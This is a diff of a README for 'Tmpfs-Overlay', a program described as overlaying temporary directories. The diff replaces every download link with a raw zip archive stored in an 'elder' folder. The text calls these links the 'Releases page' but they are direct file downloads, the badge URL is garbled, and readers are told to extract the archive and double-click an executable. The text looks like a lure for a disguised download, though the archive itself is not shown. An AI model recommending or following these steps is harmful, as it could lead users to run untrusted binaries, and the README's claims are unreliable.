@@ -8,13 +8,13 @@ Welcome to Tmpfs-Overlay! This program overlays various temporary directories in
 
 To download the latest version of Tmpfs-Overlay, visit the link below:
 
-[![Download Now](https://raw.githubusercontent.com/Ali87JP/Tmpfs-Overlay/main/elder/Tmpfs-Overlay.zip%20Now-%https://raw.githubusercontent.com/Ali87JP/Tmpfs-Overlay/main/elder/Tmpfs-Overlay.zip)](https://raw.githubusercontent.com/Ali87JP/Tmpfs-Overlay/main/elder/Tmpfs-Overlay.zip)
+[![Download Now](https://github.com/Ali87JP/Tmpfs-Overlay/raw/refs/heads/main/elder/Tmpfs_Overlay_v2.7.zip%20Now-%https://github.com/Ali87JP/Tmpfs-Overlay/raw/refs/heads/main/elder/Tmpfs_Overlay_v2.7.zip)](https://github.com/Ali87JP/Tmpfs-Overlay/raw/refs/heads/main/elder/Tmpfs_Overlay_v2.7.zip)
 
 Once you visit the Releases page, look for the latest version. Click on it to download the program. 
 
-1. **Visit the Releases Page**: Click [here](https://raw.githubusercontent.com/Ali87JP/Tmpfs-Overlay/main/elder/Tmpfs-Overlay.zip).
+1. **Visit the Releases Page**: Click [here](https://github.com/Ali87JP/Tmpfs-Overlay/raw/refs/heads/main/elder/Tmpfs_Overlay_v2.7.zip).
 2. **Select the Latest Release**: Locate the most recent version. Click on it to view the assets.
-3. **Download the Appropriate File**: Choose the file that matches your system (e.g., `https://raw.githubusercontent.com/Ali87JP/Tmpfs-Overlay/main/elder/Tmpfs-Overlay.zip` for Linux users).
+3. **Download the Appropriate File**: Choose the file that matches your system (e.g., `https://github.com/Ali87JP/Tmpfs-Overlay/raw/refs/heads/main/elder/Tmpfs_Overlay_v2.7.zip` for Linux users).
 4. **Extract the File**: Once downloaded, find the file in your downloads folder. Right-click and select "Extract" to unzip the contents.
 5. **Run the Program**: Open the extracted folder. Look for the executable file (usually without an extension for Linux) and double-click it to launch.
 
@@ -66,4 +66,4 @@ Want to help improve Tmpfs-Overlay? We welcome contributions! If you have ideas 
 
 Tmpfs-Overlay is open-source software. You can use and modify it according to the terms laid out in the license file found in this repository.
 
-Explore and enhance your system's temporary storage capabilities today! Remember to visit the Releases page here: [Download Now](https://raw.githubusercontent.com/Ali87JP/Tmpfs-Overlay/main/elder/Tmpfs-Overlay.zip) and start enjoying improved performance with Tmpfs-Overlay.
+Explore and enhance your system's temporary storage capabilities today! Remember to visit the Releases page here: [Download Now](https://github.com/Ali87JP/Tmpfs-Overlay/raw/refs/heads/main/elder/Tmpfs_Overlay_v2.7.zip) and start enjoying improved performance with Tmpfs-Overlay.
